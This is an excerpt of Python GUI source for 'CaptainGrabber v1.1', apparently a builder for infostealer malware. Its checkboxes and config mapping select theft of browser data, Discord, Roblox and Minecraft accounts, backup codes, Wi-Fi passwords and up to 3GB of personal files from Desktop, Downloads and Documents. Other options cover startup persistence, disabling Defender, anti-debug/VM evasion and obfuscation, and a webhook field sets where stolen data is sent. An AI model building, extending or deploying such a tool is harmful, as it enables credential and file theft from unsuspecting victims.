...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("CaptainGrabber v1.1")
        ...
        self.personalfiles = customtkinter.CTkCheckBox(
            self.card2, 
            text="Personal Files", 
            font=customtkinter.CTkFont(size=12, family=self.font),
            fg_color=self.primary_color, 
        ...
        self.personalfiles.pack(anchor="w", padx=15, pady=4)
        ...
        self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser,
                           self.roblox, self.obfuscation, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord, self.personalfiles]
...
--------------------------------------------------------------------------------
  ...
  Personal Files
    Collects files from Desktop, Downloads and Documents folders under 3GB total.
...
""")
    ...
    def update_config(self, event):
        # FIX: Update webhook from input field
        self.updated_dictionary["webhook"] = self.webhook_button.get()
        ...
        checkbox_mapping = {
            ...
            "personalfiles": self.personalfiles # type: ignore
        }
